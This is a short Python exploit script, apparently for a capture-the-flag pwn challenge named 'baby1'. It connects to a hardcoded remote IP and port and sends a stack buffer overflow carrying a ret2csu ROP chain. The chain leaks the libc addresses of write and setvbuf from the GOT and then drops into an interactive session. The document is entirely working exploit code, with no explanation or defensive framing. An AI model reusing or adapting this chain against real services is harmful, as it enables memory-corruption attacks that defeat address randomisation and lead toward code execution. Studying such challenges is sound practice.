from ptrlib import *

elf = ELF("./baby1")
sock = Socket("51.254.114.246", 1111)
#sock = Socket("127.0.0.1", 4001)
#_ = input()

plt_write = 0x004004b0
plt_read = 0x004004c0
plt_setvbuf = 0x004004e0
plt_resolve = 0x004004a0
rop_pop_rdi = 0x004006c3
rop_pop_rsi_pop_r15 = 0x004006c1
rop_libc_csu_init = 0x004006ba
call_libc_csu_init = 0x004006a0

payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("write")) # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(elf.got("write")) # r14 --> rsi
payload += p64(1)                # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8 # add rsp, 8
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("write")) # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(elf.got("setvbuf"))  # r14 --> rsi
payload += p64(1)                # r15 --> rdi

payload += p64(call_libc_csu_init)

sock.recvline()
sock.send(payload)
addr1 = u64(sock.recv(8))
addr2 = u64(sock.recv(8))
dump("addr1 = " + hex(addr1))
dump("addr2 = " + hex(addr2))

sock.interactive()
